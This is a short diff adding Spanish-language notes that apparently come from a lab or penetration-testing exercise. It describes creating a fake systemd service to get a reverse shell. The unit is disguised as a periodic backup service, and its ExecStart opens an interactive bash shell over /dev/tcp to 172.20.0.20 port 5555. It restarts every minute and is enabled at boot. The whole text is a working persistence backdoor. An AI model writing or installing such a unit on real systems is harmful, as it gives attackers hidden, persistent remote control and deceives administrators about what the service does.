@@ -1,1 +1,19 @@
 aqui vamos a crear un systemd falso para que genere una reverse shell
+
+cat <<EOF > /etc/systemd/system/backup-service.service
+[Unit]
+Description=Servicio de Backup Periodico
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/172.20.0.20/5555 0>&1"
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable backup-service.service
+systemctl start backup-service.service
